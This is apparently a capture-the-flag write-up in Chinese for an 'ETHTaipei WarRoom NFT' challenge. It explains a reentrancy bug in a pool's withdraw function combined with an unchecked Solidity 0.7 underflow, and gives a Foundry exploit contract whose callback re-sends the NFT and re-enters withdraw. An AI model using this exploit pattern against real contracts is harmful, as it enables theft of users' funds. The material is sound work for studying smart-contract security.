漏洞点在 `withdraw` 函数中先 safeTransferFrom 再修改余额，存在重入攻击。但 safeTransferFrom 时先 transfer 再调用 onERC721Received，单纯重入会在第二次调用时 transfer 失败，因此需要在重入前重新把 NFT 发回去。同时 solidity 0.7 默认不检测下溢，可以将余额溢出到大值。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {Pool, PoolBase} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";

contract ETHTaipeiWarRoomNFTTest is Test {
    Pool public pool;
    WarRoomNFT public nft;
    PoolBase public base;
    bool first = true;

    function setUp() public {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        base = new PoolBase(startTime, endTime, fullScore);
        base.setup();
    }

    function testExploit() public {
        nft = base.nft();
        pool = base.pool();
        uint256 tokenId = base.tokenId();
        nft.approve(address(pool), tokenId);
        pool.deposit(tokenId);
        pool.withdraw(tokenId);
        base.solve();
        assertTrue(base.isSolved());
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
        if (first) {
            first = false;
            nft.safeTransferFrom(address(this), address(pool), tokenId);
            pool.withdraw(tokenId);
        }
        return this.onERC721Received.selector;
    }
}
```

